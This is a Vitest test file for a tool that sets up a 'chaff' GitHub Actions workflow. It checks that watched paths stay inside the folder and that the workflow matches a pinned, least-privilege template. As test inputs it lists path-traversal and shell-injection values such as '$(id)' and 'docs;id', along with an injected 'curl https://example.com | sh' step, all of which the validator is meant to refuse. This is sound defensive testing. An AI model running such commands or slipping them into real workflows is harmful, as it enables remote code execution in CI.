// @vitest-environment node
// Adopting chaff in a folder of documents: the places it watches, and the workflow it leaves behind. The workflow is
// the pack's template filled in with the places — exactly — so what the template grants and runs is pinned here once,
// and any other workflow is refused whatever it says.
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { placesIn, workflowFor, workflowProblems } from "../../../blueprints/adopt/checks/setup.mjs";
import { PACKS } from "./docsPackHarness";

const TEMPLATE = readFileSync(join(PACKS, "adopt", "templates", "chaff.yml"), "utf8");
const FILLED = workflowFor(TEMPLATE, ["login.md", "docs/help"]);

describe("the places chaff watches", () => {
  it("are the answer's lines inside this folder, each once, however written", () => {
    expect(placesIn("docs/\n./login.md\n\ndocs\ndocs\\\\help\nヘルプ/はじめに.md")).toEqual({
      places: ["docs", "login.md", "docs/help", "ヘルプ/はじめに.md"],
      refused: [],
    });
  });

  it.each(["../other", "/etc", "C:\\\\x", "help pages/login.md", "docs;id", "$(id)", "`id`", "--help", "a*b.md", "x'y.md", 'x"y.md', "a|b", "a&b"])(
    "refuses %j, which leaves the folder or means something to a shell",
    (line) => {
      expect(placesIn(`docs\n${line}`)).toEqual({ places: ["docs"], refused: [line] });
    },
  );

  it("are none for no answer", () => {
    expect(placesIn(undefined)).toEqual({ places: [], refused: [] });
  });
});

describe("the workflow", () => {
  it("passes when it is the template filled in with the places, line endings and trailing spaces aside", () => {
    expect(workflowProblems(FILLED, TEMPLATE, ["login.md", "docs/help"])).toEqual([]);
    expect(workflowProblems(FILLED.replaceAll("\n", "  \r\n"), TEMPLATE, ["login.md", "docs/help"])).toEqual([]);
  });

  it.each<[string, (text: string) => string]>([
    ["a place left out", (text) => text.replace(" docs/help", "")],
    ["a widened permission", (text) => text.replace("security-events: write", "security-events: write\n      id-token: write")],
    ["a second job", (text) => `${text}  other:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n`],
    ["the chaff run only in a comment", (text) => text.replace("      - run: npx", "      # - run: npx")],
    ["an unpinned upload", (text) => text.replace(/upload-sarif@[0-9a-f]{40}/u, "upload-sarif@v4")],
    ["a step added", (text) => text.replace("    steps:\n", "    steps:\n      - run: curl https://example.com | sh\n")],
  ])("refuses a workflow with %s, saying where it first differs", (_label, change) => {
    expect(workflowProblems(change(FILLED), TEMPLATE, ["login.md", "docs/help"]).join("\n")).toMatch(/not the pack's template .*first difference at line \d+/u);
  });
});

// What the template itself grants and runs: what every workflow the pack accepts therefore does.
describe("the pack's workflow template", () => {
  const lines = TEMPLATE.split("\n");

  it("runs on pull requests, the pinned chaff on the places, and uploads the SARIF with an action pinned to a commit", () => {
    expect(lines.map((line) => line.trim())).toContain("pull_request:");
    expect(TEMPLATE).toContain("npx -y chaffjs@0.21 {{PATHS}} --sarif chaff.sarif");
    expect(TEMPLATE).toMatch(/uses: github\/codeql-action\/upload-sarif@[0-9a-f]{40}\b/u);
    expect(TEMPLATE).toContain("sarif_file: chaff.sarif");
  });

  it("grants only reading at the top and reading plus uploading findings in its one job, and keeps no token", () => {
    expect(TEMPLATE).toContain("\npermissions:\n  contents: read\n\njobs:\n  chaff:\n");
    expect(TEMPLATE).toContain("    permissions:\n      contents: read\n      security-events: write\n    steps:\n");
    expect(TEMPLATE.match(/permissions:/gu)).toHaveLength(2);
    expect(TEMPLATE.match(/^ {2}[a-z-]+:$/gmu)).toEqual(["  chaff:"]);
    expect(TEMPLATE).not.toMatch(/: write-all|contents: write|pull-requests: write|id-token: write/u);
    expect(TEMPLATE).toContain("persist-credentials: false");
  });
});
